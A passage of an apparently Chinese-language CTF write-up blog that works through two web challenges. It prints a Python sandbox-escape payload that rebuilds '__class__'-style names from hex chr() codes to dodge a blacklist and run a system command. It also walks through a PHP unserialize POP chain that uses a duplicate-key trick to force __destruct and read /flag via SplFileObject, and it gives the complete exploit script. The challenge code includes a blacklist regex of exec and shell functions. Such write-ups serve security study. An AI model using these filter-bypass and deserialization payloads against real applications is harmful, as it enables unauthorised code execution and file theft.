+遍历这些子类，找到某个子类的 __init__.__globals__
+里面就有 __builtins__
+
+这个链条就是[] → __class__ → __bases__[0] → __subclasses__() → 某个子类 → __init__ → __globals__ → __builtins__
+</code></pre><p>因为源码里面waf掉了<code>__</code>，我们不能直接写<code>__class__</code>，所以我们使用 <code>chr(95) * 2</code> 得到 <code>&quot;__&quot;</code>，拼接出<code>__class__</code>，如下</p>
+<pre tabindex="0"><code>chr(95) + chr(95) + chr(99) + chr(108) + chr(97) + chr(115) + chr(115) + chr(95) + chr(95)
+</code></pre><p>这样我们就绕过了黑名单，拿到字典</p>
+<p>Payload，这里参考了<a href="https://blog.csdn.net/RisingFan/article/details/157684234" target="_blank" rel="noopener noreferrer">RisingFan<i class="fas fa-external-link-square-alt ms-1"></i></a>师傅的wp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>clss <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>])     
+</span></span><span style="display:flex;"><span>mro <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>])                
+</span></span><span style="display:flex;"><span>sclss <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>]) 
+</span></span><span style="display:flex;"><span>it <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>])           
+</span></span><span style="display:flex;"><span>gl <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>])  
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>ss <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x6d</span>])   
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0x73</span>])                   
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x67</span>])
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>wrapc <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x6f</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x65</span>])  
+</span></span><span style="display:flex;"><span>ne <span style="color:#f92672">=</span> str()<span style="color:#f92672">.</span>join(chr(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x6e</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x5f</span>])  
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> getattr(getattr(getattr([],clss),mro)[<span style="color:#ae81ff">1</span>],sclss)():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (wrapc <span style="color:#f92672">==</span> str(getattr(i,ne))):
+</span></span><span style="display:flex;"><span>            is_my_love_event <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> event: <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            len <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> event: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> getattr(getattr(i,it),gl)[ss](cmd)
+</span></span><span style="display:flex;"><span>            print(r)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(e)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>flag因为权限读不到，目录下还有一个read_flag可以读到flag</p>
+<p><picture><img class="img-fluid " alt="chrome_CVDKrInUSg" src="" loading="lazy" />
+</picture>
+
+</p>
+<p><picture><img class="img-fluid " alt="chrome_eQlLUQmPMA" src="" loading="lazy" />
+</picture>
+
+</p>
+
+<h2 id="challenge-info----2" data-numberify>Challenge Info - [<a class="anchor ms-1" href="#challenge-info----2"></a></h2>
+<p>PHP代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Sun</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $sun;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>(){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Maybe you should fly to the &#34;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sun</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Solar</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $Sun;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Mercury;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Venus;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Earth;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Mars;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Jupiter;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Saturn;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Uranus;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $Neptune;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__set</span>($name,$key){
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Mars</span> <span style="color:#f92672">=</span> $key;
+</span></span><span style="display:flex;"><span>        $Dyson <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Mercury</span>;
+</span></span><span style="display:flex;"><span>        $Sphere <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Venus</span>;
+</span></span><span style="display:flex;"><span>        $Dyson<span style="color:#f92672">-&gt;</span>$Sphere($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Mars</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>($func,$args){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/exec|popen|popens|system|shell_exec|assert|eval|print|printf|array_keys|sleep|pack|array_pop|array_filter|highlight_file|show_source|file_put_contents|call_user_func|passthru|curl_exec/i&#34;</span>, $args[<span style="color:#ae81ff">0</span>])){
+</span></span><span style="display:flex;"><span>            $exploar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $func($args[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>            $road <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Jupiter</span>;
+</span></span><span style="display:flex;"><span>            $exploar<span style="color:#f92672">-&gt;</span>$road($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Saturn</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Black hole&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Moon</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $nearside;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $farside;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__tostring</span>(){
+</span></span><span style="display:flex;"><span>        $starship <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nearside</span>;
+</span></span><span style="display:flex;"><span>        $starship();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Earth</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $onearth;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $inearth;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $outofearth;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>(){
+</span></span><span style="display:flex;"><span>        $oe <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">onearth</span>;
+</span></span><span style="display:flex;"><span>        $ie <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">inearth</span>;
+</span></span><span style="display:flex;"><span>        $ote <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">outofearth</span>;
+</span></span><span style="display:flex;"><span>        $oe<span style="color:#f92672">-&gt;</span>$ie <span style="color:#f92672">=</span> $ote;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;travel&#39;</span>])){
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_POST[<span style="color:#e6db74">&#39;travel&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;How to Travel?&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>我们的最终利用点是<code>SplFileObject::fpassthru()</code></p>
+<p>在 <code>Solar::__call</code> 里有：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$exploar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $func($args[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>$road <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Jupiter</span>;
+</span></span><span style="display:flex;"><span>$exploar<span style="color:#f92672">-&gt;</span>$road($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Saturn</span>);
+</span></span></code></pre></div><p>因为黑名单过滤了很多直接读文件的函数（<code>file_get_contents</code>、<code>fopen</code>、<code>readfile</code>），但没有过滤 <code>SplFileObject</code> 类和它的 <code>fpassthru</code> 方法，所以我们要传入 <code>$func=&quot;SplFileObject&quot;</code>、<code>$args[0]=&quot;/flag&quot;</code>、<code>$road=&quot;fpassthru&quot;</code></p>
+<blockquote>
+<p>SplFileObject是PHP原生文件操作类，fpassthru可直接输出文件内容</p>
+</blockquote>
+<p>而<code>Solar::__call</code> 能实例化自定义类并方法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__call</span>($func, $args) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// $func: 类名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// $args[0]: 构造参数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Jupiter: 方法名（如fpassthru）
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Saturn: 方法参数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p><code>Solar::__call</code> 在<strong>调用一个不存在的方法</strong>时触发。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__set</span>($name, $key){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Mercury：$Dyson，是Solar
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Venus：$Sphere，设置成 &#39;SplFileObject&#39;，Solar对象没有这个方法
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Mars：赋给$key，可传&#39;/flag&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 于是 $Dyson-&gt;$Sphere($this-&gt;Mars) 即 Solar-&gt;__call(&#39;SplFileObject&#39;, [&#39;/flag&#39;])
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>我们要对Solar设置一个未定义属性，使用到<code>Earth::__invoke</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>(){
+</span></span><span style="display:flex;"><span>    $oe <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">onearth</span>;     <span style="color:#75715e">// Solar对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $ie <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">inearth</span>;     <span style="color:#75715e">// 比如 &#39;xxx&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $ote <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">outofearth</span>; <span style="color:#75715e">// &#39;/flag&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $oe<span style="color:#f92672">-&gt;</span>$ie <span style="color:#f92672">=</span> $ote; <span style="color:#75715e">// Solar-&gt;$xxx=&#39;/flag&#39;，但是$xxx没有定义，触发Solar-&gt;__set($ie, &#39;/flag&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p><code>__invoke</code>的触发需要对象被当作函数调用，把Earth对象当成函数执行(Earth对象加括号)</p>
+<p>于是我们找到<code>Moon::__toString</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__tostring</span>(){
+</span></span><span style="display:flex;"><span>    $starship <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nearside</span>;   <span style="color:#75715e">// Earth对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $starship();                   <span style="color:#75715e">// 直接Earth-&gt;__invoke()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>于是我们要触发<code>__toString</code>，发现<code>Sun::__destruct</code>会拼接字符串涉及Moon对象</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Maybe you should fly to the &#34;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sun</span>); <span style="color:#75715e">// $this-&gt;sun 是 Moon对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Moon对象遇字符串拼接强转__toString --&gt; Earth-&gt;__invoke ... 直到Solar-&gt;__call
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>但是&hellip;正常执行流程不会触发__destruct！怎么办？</p>
+<p><strong>让Sun对象在unserialize后&quot;丢失引用&quot;，马上触发__destruct</strong></p>
+<p>利用<strong>PHP的反序列化key覆盖机制</strong>：</p>
+<ul>
+<li>使用数组：<code>[0=&gt;$sun, 1=&gt;'dummy']</code></li>
+<li>serialize后，字符串里有<code>i:0;O:3:&quot;Sun&quot;....i:1;s:5:&quot;dummy&quot;;</code></li>
+<li>手动将<code>i:1;</code>改为<code>i:0;</code>，后面那个&quot;覆盖&quot;了前面位置，前者直接成为“孤儿”，<strong>立即调用__destruct</strong></li>
+</ul>
+<p>整个链条：</p>
+<pre tabindex="0"><code>整条链在payload里怎么嵌套？
+Sun对象 → $sun = Moon
+Moon对象 → $nearside = Earth
+Earth对象 → $onearth = SolarA，$inearth任意，$outofearth=&#39;/flag&#39;
+SolarA → Mercury = SolarB, Venus=&#39;SplFileObject&#39;, Mars=&#39;/flag&#39;
+SolarB → Jupiter=&#39;fpassthru&#39;, Saturn=null
+组合到array，反序列化后key覆盖
+Sun::destruct触发，层层串联，SolarB-&gt;__call 读flag
+</code></pre><p>exp：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Sun</span> { <span style="color:#66d9ef">public</span> $sun; }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Moon</span> { <span style="color:#66d9ef">public</span> $nearside; }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Earth</span> { <span style="color:#66d9ef">public</span> $onearth; <span style="color:#66d9ef">public</span> $inearth; <span style="color:#66d9ef">public</span> $outofearth; }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Solar</span> { <span style="color:#66d9ef">public</span> $Mercury; <span style="color:#66d9ef">public</span> $Venus; <span style="color:#66d9ef">public</span> $Jupiter; <span style="color:#66d9ef">public</span> $Saturn; <span style="color:#66d9ef">public</span> $Mars; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// --- 构造主链 --- 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$sun <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Sun</span>();
+</span></span><span style="display:flex;"><span>$sun<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sun</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Moon</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Moon链Earth
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$earth <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Earth</span>();
+</span></span><span style="display:flex;"><span>$sun<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sun</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">nearside</span> <span style="color:#f92672">=</span> $earth;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$earth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">onearth</span> <span style="color:#f92672">=</span> $solarA <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Solar</span>();
+</span></span><span style="display:flex;"><span>$earth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">inearth</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;exploit&#34;</span>;     <span style="color:#75715e">// SolarA没有这个属性名即可
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$earth<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">outofearth</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/flag&#34;</span>;    <span style="color:#75715e">// 要读的文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>$solarA<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Mercury</span> <span style="color:#f92672">=</span> $solarB <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Solar</span>(); <span style="color:#75715e">// Mercury是SolarB
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$solarA<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Venus</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SplFileObject&#34;</span>;         <span style="color:#75715e">// Venus是未定义方法名
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>$solarA<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Mars</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/flag&#34;</span>;                  <span style="color:#75715e">// __set参数会传到Mars
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$solarB<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Jupiter</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fpassthru&#34;</span>;           <span style="color:#75715e">// 方法fpassthru可回显
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$solarB<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Saturn</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;                   <span style="color:#75715e">// 参数可为null
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// --- 准备覆盖key payload ---
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$arr <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span> <span style="color:#f92672">=&gt;</span> $sun, <span style="color:#ae81ff">1</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;dummy&#34;</span>];
+</span></span><span style="display:flex;"><span>$ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($arr);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 关键覆盖：使第一个对象失去引用，触发__destruct
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ser <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/i:1;/&#39;</span>, <span style="color:#e6db74">&#39;i:0;&#39;</span>, $ser);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;urlencode后payload如下（POST于travel参数）：</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>($ser);
+</span></span></code></pre></div>
+<h3 id="原理详解" data-numberify>原理详解<a class="anchor ms-1" href="#原理详解"></a></h3>
+<ul>
+<li>
+<p>PHP的反序列化时，如果数组中有重复的key，比如</p>
+<pre tabindex="0"><code>array(0 =&gt; $obj, 0 =&gt; &#34;a&#34;)
+</code></pre><ul>
+<li>后面的key会<strong>覆盖</strong>前面的，</li>
+<li>被覆盖的对象立刻<strong>失去全部引用</strong>，</li>
+<li>反序列化过程中对象&quot;即将被销毁&quot;，</li>
+<li>PHP内部会在此刻<strong>立即执行其<code>__destruct()</code>方法</strong>（准确说是反序列化“覆盖失去引用直接销毁”，并不是到GC环节才处理）。</li>
+</ul>
+</li>
+<li>
